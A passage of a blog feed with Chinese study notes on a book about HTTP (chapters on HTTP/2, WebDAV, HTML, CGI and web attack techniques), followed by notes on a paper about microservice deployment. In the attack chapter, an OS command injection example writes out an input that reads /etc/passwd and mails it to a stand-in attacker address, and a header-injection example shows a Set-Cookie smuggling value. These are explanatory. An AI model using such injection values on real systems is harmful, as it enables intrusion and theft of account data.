Force，互联网工程任务组）创立httpbis工作组，其目标是推进下一代HTTP/2.0实现标准化</p></li><li><p>HTTP/2.0的目标：改善用户在使用Web时的速度体验</p></li></ul><h3 id="9.5-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%E7%9A%84webdav" tabindex="-1">9.5 Web服务器管理文件的WebDAV</h3><ul><li>WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）是一个可对Web服务器上的内容直接进行文件复制，编辑等操作的分布式文件系统，作为扩展HTTP/1.1的协议定义在RFC4918中</li><li>除创建删除文件等基本功能，还具备文件创建者管理，文件编辑过程中的加锁功能，以及文件内容修改的版本控制功能</li></ul><h2 id="%E7%AC%AC%E5%8D%81%E7%AB%A0-%E6%9E%84%E5%BB%BAweb%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF" tabindex="-1">第十章 构建Web内容的技术</h2><h3 id="10.1-html" tabindex="-1">10.1 HTML</h3><ul><li>Web页面几乎全由HTML构建<ul><li>HTML（HyperText Markup Language，超文本标记语言）。</li><li>超文本是一种文档系统，可以将文档中任意位置的信息和其他信息（文本或图片等）建立关联，即超链接文本</li><li>标记语言是指通过在文档的某部分穿插特别的字符串标签，用来修饰文档的语言，在HTML文档中，这种特殊的标签称为HTML标签Tag</li><li>HTML的版本：目前是HTML5版本</li><li>设计应用CSS：CSS（Cascading Style Sheets，层叠样式表）可以指定如何展现HTML内的各种元素，属于样式表标准之一<ul><li>通过改变应用的CSS，用浏览器看到的页面外观也会随之改变</li><li>CSS的理念就是让文档的结构和设计分离，达到解耦的目的</li></ul></li></ul></li></ul><h3 id="10.2-%E5%8A%A8%E6%80%81html" tabindex="-1">10.2 动态HTML</h3><ul><li><p>动态HTML：指使用客户端脚本语言将静态的HTML内容变成动态的技术总称。</p></li><li><p>动态HTML技术通过调用客户端脚本语言JavaScript，实现对HTML的Web页面的动态改造，利用DOM（Document Object Model 文档对象模型）可指定欲发生动态变化的HTML元素</p></li><li><p>DOM是用操作HTML文档和XML文档的API。使用DOM可以将HTML内的元素当作对象操作。</p></li><li><p>通过调用JavaScript等脚本对DOM操作，可以以更为简单的方式控制HTML</p></li></ul><h3 id="10.3-web%E5%BA%94%E7%94%A8" tabindex="-1">10.3 Web应用</h3><ul><li><p>通过Web提供功能的Web应用</p><ul><li>原本HTTP协议的Web机制是对客户端发来的请求返回提前准备好的内容</li><li>但随着Web的普及，需要引入程序创建HTML内容的做法</li></ul></li><li><p>与Web服务器及程序协作的CGI</p><ul><li>CGI（Common Gateway Interface，通用网关接口）是指Web服务器在接受客户端发送过来的请求后转发给程序的一组机制</li><li>在CGI的作用下，程序会对请求内容做出相应的动作，比如创建HTML等动态内容</li></ul></li><li><p>因Java而普及的Servlet</p><ul><li>Servlet是一种能在服务器上创建动态内容的程序。Servlet是用Java实现的一个接口，数据JavaEE的一部分</li><li>CGI由于每次接到请求，程序都需要启动一次，因此一旦访问量过大，Web服务器需要承担巨大的负担，而Servlet运行在与Web服务器相同的进程中，因此负载较小</li><li>Servlet的运行环境叫做Web容器或Servlet容器</li><li>Servlet作为解决CGI问题的对抗技术，随Java一起得到了普及</li></ul></li></ul><h3 id="10.4-%E6%95%B0%E6%8D%AE%E5%8F%91%E5%B8%83%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%92%8C%E8%AF%AD%E8%A8%80" tabindex="-1">10.4 数据发布的格式和语言</h3><ul><li><p>可扩展标记语言（XML eXtensible Markup Language）是一种可按应用目标进行扩展的通用标记语言。</p><ul><li>XML和HTML都是从标准通用标记语言SGML（Standard Generalized Markup Language）简化而来</li></ul></li><li><p>发布更新信息的RSS/Atom</p><ul><li>RSS（简易信息聚合，也叫聚合内容）和Atom都是发布新闻或博客日志等更新信息文档的格式的总成，都是用到了XML</li></ul></li><li><p>JavaScript衍生的轻量级易用JSON</p><ul><li>JSON（JavaScript Object Notation）是一种以JavaScript的对象表示法为基础的轻量级数据表示语言，能够处理的数据类型有 false/null/true/对象/数组/数字/字符串，这7种类型</li></ul></li></ul><h2 id="%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF" tabindex="-1">第十一章 Web的攻击技术</h2><h3 id="11.1-%E9%92%88%E5%AF%B9web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF" tabindex="-1">11.1 针对Web的攻击技术</h3><ul><li>简单的HTTP协议本身不存在安全问题，因此协议本身不会成会攻击对象。应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源才是攻击目标</li></ul><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_1.jpg" alt></p><ul><li><p>HTTP只是一个通用的单纯协议机制，具备很多又是，但安全性上是劣势</p><ul><li>对于Web网站需要的会话管理，加密处理等安全性方面的共呢个，开发者需要自行开发并设计</li><li>而自行设计意味着安全等级不完备，存在Bug</li></ul></li><li><p>在客户端可以篡改请求</p><ul><li>Web应用中接收到的请求在客户端都可以自由的篡改</li><li>在HTTP请求报文中加载攻击代码，即可对Web应用攻击</li></ul></li><li><p>针对Web应用的攻击模式</p><ul><li>主动攻击：<ul><li>指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。</li><li>由于该模式直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到资源</li><li>主动攻击代表：SQL住区和OS命令攻击</li></ul></li><li>被动攻击：<ul><li>指领用圈套策略执行攻击代码的攻击模式，此时攻击者不直接对目标Web应用访问发起攻击</li><li>通常攻击模式如下<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_2.jpg" alt><ul><li><ol><li>攻击者诱使用户出发已设置好的陷阱，而陷阱会启动发送已经嵌入攻击代码的HTTP请求</li></ol></li><li><ol start="2"><li>当用户不知不觉中中招之后，用户的浏览器或邮件客户端会触发这个陷阱</li></ol></li><li><ol start="3"><li>中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用，进行代码攻击</li></ol></li><li><ol start="4"><li>执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果</li></ol></li></ul></li><li>代表：跨站脚本攻击和跨站请求伪造</li><li>利用被动攻击，可以对原本无法从互联网上访问到的企业内网等网络发起攻击<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_3.jpg" alt></li></ul></li></ul></li></ul><h3 id="11.2-%E5%9B%A0%E8%BE%93%E5%87%BA%E5%80%BC%E8%BD%AC%E4%B9%89%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.2 因输出值转义不完全引发的安全漏洞</h3><ul><li>实施Web应用的安全对策可大致分为以下两部分<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_4.jpg" alt><ul><li>客户端的验证<ul><li>可以使用JS在客户端验证数据，但可能发生数据篡改数据或关闭JS，因此JS验证不适合作为安全防范对策</li><li>保留客户端验证可以尽可能早的识别出输入错误，提高UI体验</li></ul></li><li>Web应用端的验证<ul><li>输入值验证：检查是否符合系统业务逻辑的数值或检查字符编码等预防对策</li><li>输出值转义：当输出值转义出现问题，可能会触发攻击者传入的攻击代码</li></ul></li></ul></li></ul><h4 id="11.2.1-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB" tabindex="-1">11.2.1 跨站脚本攻击</h4><ul><li><p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript进行的一种攻击。</p></li><li><p>可能造成的影响</p><ul><li>利用虚假输入表单骗取用户个人信息</li><li>利用脚本窃取用户Cookie值，被害者不知情的情况下，帮助攻击者发送恶意请求</li><li>显示伪造的图片或文章</li></ul></li><li><p>跨站脚本攻击案例<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_5.jpg" alt></p></li><li><p>XSS是攻击者利用预先设置的陷阱触发的被动攻击</p></li></ul><h4 id="11.2.2-sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.2 SQL注入攻击</h4><ul><li>SQL注入是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。该安全隐患有可能引发极大威胁，引起机密信息丢失</li><li>SQL是用来操作关系型数据库管理系统的数据库语言</li><li><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_6.jpg" alt></li></ul><h4 id="11.2.3-os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.3 OS命令注入攻击</h4><ul><li>OS命令注入攻击：通过Web应用执行非法的操作系统命令达到攻击的谜底，只要在能调用shell函数的地方就有可能存在攻击</li></ul><pre><code class="language-cmd">my $adr = $q-&gt;param('mailaddress');open(MAIL, &quot;¦ /usr/sbin/sendmail $adr&quot;);print MAIL &quot;From: info@example.com\n&quot;;</code></pre><p>如果攻击者将以下值作为邮件地址</p><pre><code class="language-cmd">; cat /etc/passwd ¦ mail hack@example.jp</code></pre><p>程序接收该值，构成以下的命令组合。</p><pre><code class="language-cmd">¦ /usr/sbin/sendmail ; cat /etc/passwd ¦ mail hack@example.jp</code></pre><p>攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。<br>可见，sendmail 命令执行被分隔后，接下去就会执行 cat /etc/passwd | mail <a href="mailto:hack@example.jp">hack@example.jp</a> 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 <a href="mailto:hack@example.jp">hack@example.jp</a>。</p><h4 id="11.2.4-http%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.4 HTTP首部注入攻击</h4><ul><li><p>指攻击者在响应首部字段插入换行，添加任意响应首部或主体的一种攻击，属于被动攻击。</p></li><li><p>案例：</p><ul><li>形如：Location: <a href="http://example.com/?cat=101">http://example.com/?cat=101</a></li><li>攻击者用<code>101%0D%0ASet-Cookie:+SID=123456789</code>替代101</li><li>其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（<a href="http://hackr.jp/%EF%BC%89%E7%9A%84%E4%BC%9A%E8%AF%9D">http://hackr.jp/）的会话</a> ID 设置成 SID=123456789 的Set-Cookie 首部字段</li><li>当结果返回</li></ul><pre><code>Location: http://example.com/?cat=101（%0D%0A ：换行符）Set-Cookie: SID=123456789</code></pre><ul><li>此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户</li></ul></li><li><p>HTTP响应截断攻击：HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。</p></li></ul><h4 id="11.2.5-%E9%82%AE%E4%BB%B6%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.5 邮件首部注入攻击</h4><p>邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告邮件或病毒邮件。</p><h4 id="11.2.6-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB" tabindex="-1">11.2.6 目录遍历攻击</h4><p>目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击。</p><h4 id="11.2.7-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E" tabindex="-1">11.2.7 远程文件包含漏洞</h4><p>远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。</p><h3 id="11.3-%E5%9B%A0%E8%AE%BE%E7%BD%AE%E6%88%96%E8%AE%BE%E8%AE%A1%E4%B8%8A%E7%9A%84%E7%BC%BA%E9%99%B7%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.3 因设置或设计上的缺陷引发的安全漏洞</h3><ul><li><p>强制浏览：从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件</p><ul><li>对不公开的文件，为了安全会隐蔽其URL，但一旦知道了URL，便可以通过URL浏览对应的文件，而URL很有可能泄露<ul><li>文件目录一览</li><li>容易被推测的文件名和目录名</li><li>备份文件：备份文件无执行权限，可能以源代码形式显示</li><li>经认证才能显示的文件</li></ul></li></ul></li><li><p>不正确的错误处理</p><ul><li>与Web应用有关的错误信息<ul><li>Web应用抛出的错误信息：提示消息会暴露一些信息</li><li>数据库等系统抛出的错误信息：会给攻击者以启发</li></ul></li></ul></li><li><p>开放重定向：是一种对指定的任意 URL 作重定向跳转的功能</p><ul><li>漏洞：假如指定的重定向URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web网站</li></ul></li></ul><h3 id="11.4-%E5%9B%A0%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E8%80%8C%E7%96%8F%E5%BF%BD%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.4 因会话管理而疏忽的安全漏洞</h3><ul><li><p>会话劫持：指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。</p><ul><li>具备认证功能的Web应用，使用会话ID的会话管理机制。会话ID中记录客户端的Cookie信息，服务端将 会话ID与认证状态进行一对一匹配管理</li><li>可获得会话ID的途径<ul><li>通过非珍贵的生成方法推测会话ID</li><li>通过窃听或XSS攻击盗取会话ID</li><li>通过会话固定攻击（Session Fixation）强行获取会话ID</li></ul></li></ul></li><li><p>会话固定攻击：强制用户使用攻击者指定的会话ID，属于被动攻击</p></li><li><p>跨站点请求伪造：指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击</p></li></ul><h3 id="11.5-%E5%85%B6%E5%AE%83%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.5 其它安全漏洞</h3><ul><li><p>密码破解：密码破解攻击（Password Cracking）即算出密码，突破认证。</p><ul><li>手段<ul><li>通过网络的密码试错<ul><li>穷举法</li><li>字典攻击：收集好候选密码组成字典，枚举字典</li></ul></li><li>对已经加密的密码的破解<ul><li>通过穷举法·字典攻击进行类推</li><li>彩虹表：是由明文密码及与之对应的散列值构成的一张数据库表，是一种通过事先制作庞大的彩虹表，可在穷举法 • 字典攻击等实际破解过程中缩短消耗时间的技巧</li><li>拿到密钥</li><li>加密算法的漏洞</li></ul></li></ul></li></ul></li><li><p>点击劫持：指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p></li><li><p>Dos攻击（Denial of Service attack）</p><ul><li>是一种让运行中的服务呈停止状态的攻击，也叫做服务停止攻击或拒绝服务攻击。</li><li>两种Dos攻击方式<ul><li>集中利用访问请求造成资源过载，资源耗尽的同时实际上服务也呈停止状态</li><li>通过攻击安全漏洞使服务停止</li></ul></li><li>多台计算机发起的Dos攻击称为DDOS（Distributed DOS）</li></ul></li><li><p>后门程序：是指开发设置的隐藏入口，可不按正常步骤使用受限功能</p><ul><li>开发阶段作为 Debug 调用的后门程序</li><li>开发者为了自身利益植入的后门程序</li><li>攻击者通过某种方法设置的后门程序</li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Share:Balancing Layer and Chain Sharing in Industrial Microservice Deployment</title>
      <link href="/2023/06/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/Balancing%20Layer%20and%20Chain%20Sharing%20in%20Industrial%20Microservice%20Deployment/"/>
      <url>/2023/06/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/Balancing%20Layer%20and%20Chain%20Sharing%20in%20Industrial%20Microservice%20Deployment/</url>
      
        <content type="html"><![CDATA[<h2 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h2><ul><li>随着智能制造的快速发展，面向边缘计算的微服务平台正在成为生产控制的重要组成部分。</li><li>在微服务的容器化部署中：<ul><li>层共享可以减少由于镜像拉取而导致的巨大带宽消耗</li><li>而链共享可以减少微服务之间通信引起的通信开销</li></ul></li><li>这两种共享方法利用每个微服务的特性在部署过程中共享资源。然而，由于边缘服务器资源有限，很难同时满足这两种方法的优化目标。因此，通过平衡这两种共享方法来实现提高服务响应效率至关重要。</li><li>本文研究了一种能够平衡微服务的层共享和链共享的最佳微服务部署策略。我们通过模型重构，将最小化微服务镜像拉取延迟和通信开销的问题转化为线性约束整数二次规划问题。通过连续凸近似（SCA）方法得到一个部署策略。</li><li>实验结果表明，所提出的部署策略可以平衡这两种资源共享方法。当两种共享方法被平等考虑时，平均镜像拉取延迟可以降低到基准值的65％，平均通信开销可以降低到基准值的30％。</li></ul><h2 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h2><ul><li><p>传统的工业软件采用单体服务架构。服务内部的高耦合和占用率会增加整个系统的复杂性。其可扩展性、稳定性和容错性很难满足智能制造的要求。</p></li><li><p>通过微服务架构，一个完整的服务可以拆分为多个松耦合的微服务。不同的微服务在逻辑上是独立的，具有很高的灵活性、可扩展性和容错性，可以很好地适应智能制造的需求。</p></li><li><p>根据不同的服务请求和部署策略，将打包成Docker镜像的每个微服务可以通过容器编排工具k8s部署到边缘服务器上。</p></li><li><p>在微服务的容器化部署中，服务效率是评估部署解决方案质量的重要指标。服务效率主要受两个方面的影响。</p><ul><li>一方面是微服务的启动时间。它主要取决于Docker镜像的拉动延迟，这些镜像通过不同的镜像层存储在云端</li><li>另一方面是微服务之间的通信开销。它取决于微服务之间的数据交换量。<ul><li>一个工业应用可以由部署在一个或多个边缘服务器上的多个微服务完成。这些微服务可以被称为微服务链，同一微服务链中的微服务之间将频繁进行数据交换。</li></ul></li></ul></li><li><p>基于上述两个方面，通过资源共享来提高服务效率非常重要。为提高服务效率，有两种资源共享策略。</p><ul><li>一种资源共享策略是层共享：Docker原生支持层的共享。如果部署在同一边缘服务器上的微服务使用相同的镜像层，拉取镜像时将不会重复拉取该层。这个层可以被服务器上的所有微服务共享。层共享可以有效减少镜像拉取延迟，从而提高微服务的启动速度和服务响应效率。</li><li>另一种资源共享策略是链共享：它可以定义为部署在同一服务器上的微服务之间的数据共享。在微服务链中，相邻的两个微服务之间会频繁进行数据传输。如果两个微服务部署在同一服务器上，下一个微服务可以通过链共享直接访问数据，而无需进行多跳数据传输。链共享可以减少数据传输引起的延迟和数据丢失。</li></ul></li><li><p>由于边缘服务器的资源有限，不可能将所有的微服务都部署在同一台边缘服务器上。因此，有必要找到一种在层共享和链共享之间进行权衡的最优微服务部署策略。</p></li><li><p>由于边缘服务器的资源有限，微服务部署策略无法同时充分利用不同的资源，因此，还需要一种方法来合理地分配资源给部署在服务器上的不同微服务，并最大化资源的利用。</p></li><li><p>本文贡献：</p><ul><li><ol><li>我们通过同一模型描述了微服务的分层结构和链式结构。建立了一个整数规划问题，以最小化镜像拉取延迟和通信开销。</li></ol></li><li><ol start="2"><li>通过模型重构，证明了整数规划问题可以转化为带有线性约束的整数二次规划问题。通过使用连续凸逼近（SCA）方法获得最优解。该方法可以有效平衡镜像拉取延迟和通信开销。</li></ol></li><li><ol start="3"><li>提出了一种用于边缘服务器的资源重新分配算法，以充分利用闲置的计算资源。</li></ol></li><li><ol start="4"><li>通过实验，在镜像拉取延迟和服务间通信开销等多个维度上评估了结果。实验证明了所提方法的有效性。</li></ol></li></ul></li></ul><p>第2节简要回顾了相关文献。<br>第3节对系统的分层结构和链式结构进行建模，并给出了问题的形式化描述。<br>第4节解决了提出的问题。<br>第5节提出了一种用于边缘服务器的资源重新分配算法。<br>第6节评估了所提方法的结果。<br>第7节讨论了限制和未来工作。<br>第8节对论文进行了总结。</p><h2 id="2-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">2 相关工作</h2><h2 id="3-%E7%B3%BB%E7%BB%9F%E5%BB%BA%E6%A8%A1%E5%92%8C%E9%97%AE%E9%A2%98%E8%A1%A8%E8%BF%B0" tabindex="-1">3 系统建模和问题表述</h2><h3 id="3.1-%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90" tabindex="-1">3.1 一个简单例子</h3><p><img src="/images/%E8%AE%BA%E6%96%87/Balancing%20Layer%20and%20Chain%20Sharing%20in%20IIndustrial%20Microservice%20Deployment/3_1.png" alt><br><img src="/images/%E8%AE%BA%E6%96%87/Balancing%20Layer%20and%20Chain%20Sharing%20in%20IIndustrial%20Microservice%20Deployment/3_2.png" alt></p><ul><li><p>如图示，考虑一个有两个微服务和一个有三个微服务的应用程序，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><msub><mi>s</mi><mrow><mi>k</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ms_{ki}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ki</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>表示第k个软件的第i个微服务</p></li><li><p>每个微服务镜像有不同数量的镜像层组成。三个服务器与云服务器之间的带宽为120 MB/s，并且两个相邻服务器之间可以通过单跳到达。</p></li><li><p>a为层共享策略，此时将有相同镜像层的微服务部署在一起，可以实现镜像层的共享，但同一软件间需要传输数据。</p></li><li><p>b为链共享策略，同一软件的微服务在一个服务器上部署，传输数据大小为0，但要拉取所有镜像</p></li><li><p>c为同时考虑链共享和层共享，三种策略的具体时间比较见表。</p></li></ul><h3 id="3.2-%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9E%8B" tabindex="-1">3.2 系统模型</h3><h3 id="3.3-%E9%97%AE%E9%A2%98%E5%BD%A2%E5%BC%8F%E5%8C%96%E6%8F%8F%E8%BF%B0" tabindex="-1">3.3 问题形式化描述</h3><h2 id="4-%E5%9F%BA%E4%BA%8Esca%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2%E6%96%B9%E6%A1%88" tabindex="-1">4 基于SCA的微服务部署方案</h2><h3 id="4.1-%E9%97%AE%E9%A2%98%E8%BD%AC%E5%8C%96" tabindex="-1">4.1 问题转化</h3><h3 id="4.2-%E5%9F%BA%E4%BA%8Esca%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">4.2 基于SCA的方法</h3><h3 id="4.3-%E6%94%B6%E6%95%9B%E5%88%86%E6%9E%90" tabindex="-1">4.3 收敛分析</h3><h2 id="5-%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E6%96%B9%E6%B3%95" tabindex="-1">5 资源分配方法</h2><h3 id="5.1-%E9%97%AE%E9%A2%98%E6%8F%8F%E8%BF%B0" tabindex="-1">5.1 问题描述</h3><h3 id="5.2-%E5%9F%BA%E4%BA%8E%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B9%98%E6%95%B0%E6%B3%95%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88" tabindex="-1">5.2 基于拉格朗日乘数法的解决方案</h3><h2 id="6-%E8%A1%A8%E7%8E%B0%E8%AF%84%E4%BC%B0" tabindex="-1">6 表现评估</h2><h3 id="6.1-%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C" tabindex="-1">6.1 模拟实验</h3><h3 id="6.2-%E7%94%A8%E7%9C%9F%E5%AE%9E%E7%9A%84%E8%BE%B9%E7%BC%98%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%AE%9E%E9%AA%8C" tabindex="-1">6.2 用真实的边缘服务器进行实验</h3><h3 id="6.3-%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%A1%88%E4%BE%8B" tabindex="-1">6.3 大规模的案例</h3><h2 id="7-%E8%AE%A8%E8%AE%BA" tabindex="-1">7 讨论</h2><ul><li><p>高时间和空间复杂性：所提出的方法在大规模场景中具有高时间和空间复杂性。虽然可以在可接受的时间内获得最优解，但需要进一步优化以提高可扩展性。未来的研究应着重开发高效的算法或优化技术，以降低计算复杂度。</p></li><li><p>考虑请求频率：通信开销不仅取决于通信数据量，还取决于请求频率。即使每次传输的数据量较小，高请求频率也会显著增加通信开销。在计算通信开销时，考虑通信数据量和请求频率的乘积是非常重要的。未来的工作可以探索将请求频率作为输入参数，以准确估计通信开销。</p></li><li><p>动态微服务部署：微服务不是静态的，部署过程涉及关闭、迁移和添加新的微服务。在面对动态场景时，需要相应的部署算法以适应变化。未来的研究可以探索使用人工智能或其他方法，在初始部署结果之后进行训练，以动态调整微服务的部署。</p></li></ul><h2 id="8-%E7%BB%93%E8%AE%BA" tabindex="-1">8 结论</h2><ul><li>本文研究了微服务的层共享和链共享，并探索了一种可以平衡这两种资源共享方式的微服务部署方案。<ul><li>我们建立了一个旨在最小化图像拉取延迟和通信开销的问题。通过模型重构，将问题转化为一个具有线性约束的整数二次规划问题，并通过连续凸逼近（SCA）方法获得部署策略。</li><li>我们还提出了一种资源重新分配算法，以充分利用服务器的空闲资源。</li></ul></li></ul><h2 id="%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A" tabindex="-1">名词解释</h2><h3 id="docker%E7%9A%84%E5%B1%82%E7%BA%A7" tabindex="-1">Docker的层级</h3><ul><li><p>Docker 镜像是构建容器的基础，它包含了一个完整的文件系统，包括操作系统、应用程序和依赖项。镜像是只读的，意味着一旦创建就不可更改。</p></li><li><p>Docker 镜像采用了分层的文件系统结构，这是 Docker 的一个重要特性。每个镜像由多个文件系统层构成，每个层都是只读的，并且可以被其他镜像共享和重用。这种分层结构使得镜像的构建和管理变得非常高效。</p></li><li><p>下面是 Docker 镜像层的一些重要概念：</p><ul><li>基础镜像层（Base Image Layer）：这是 Docker 镜像的第一个层，它通常包含操作系统的基本文件系统。基础镜像层是只读的，所有其他层都依赖于它。</li><li>中间镜像层（Intermediate Image Layers）：在构建 Docker 镜像时，可以在基础镜像层之上添加多个中间镜像层。每个中间镜像层都是基于前一个层进行的修改或添加，例如安装软件包、配置环境等。每个中间镜像层都会生成一个唯一的标识符，用于表示该层的内容。</li><li>最终镜像层（Final Image Layer）：最后一个中间镜像层被称为最终镜像层。它是由之前的中间镜像层构建而成，代表了完整的容器镜像。最终镜像层是可读写的，并且可以在容器中运行和修改。</li></ul></li><li><p>使用分层结构的好处是，当多个镜像共享相同的层时，这些层只需要在磁盘上存储一次，可以被多个镜像同时使用，节省了存储空间。此外，当基础镜像或中间镜像层发生变化时，只需重新构建受影响的层，而不必重新构建整个镜像，提高了构建速度和效率。</p></li><li><p>总结一下，Docker 镜像层是构成 Docker 镜像的一组只读文件系统层，通过分层结构实现了高效的镜像构建和共享。每个镜像层都包含了特定的文件系统更改或添加，最终构成一个完整的容器镜像。</p></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RBAC模型学习</title>
      <link href="/2023/06/06/%E5%B7%A5%E5%85%B7/RBAC/"/>
      <url>/2023/06/06/%E5%B7%A5%E5%85%B7/RBAC/</url>
      
